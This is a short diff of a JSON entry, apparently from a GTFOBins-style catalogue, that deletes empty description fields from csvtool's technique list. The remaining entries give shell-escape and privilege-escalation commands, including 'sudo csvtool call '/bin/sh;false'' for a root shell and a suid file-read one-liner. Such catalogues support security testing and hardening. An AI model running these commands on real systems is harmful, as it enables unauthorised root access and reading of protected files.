@@ -14,19 +14,19 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
       }
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "csvtool call '/bin/sh;false' /etc/passwd\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo csvtool call '/bin/sh;false' /etc/passwd\n"
       }
     ]
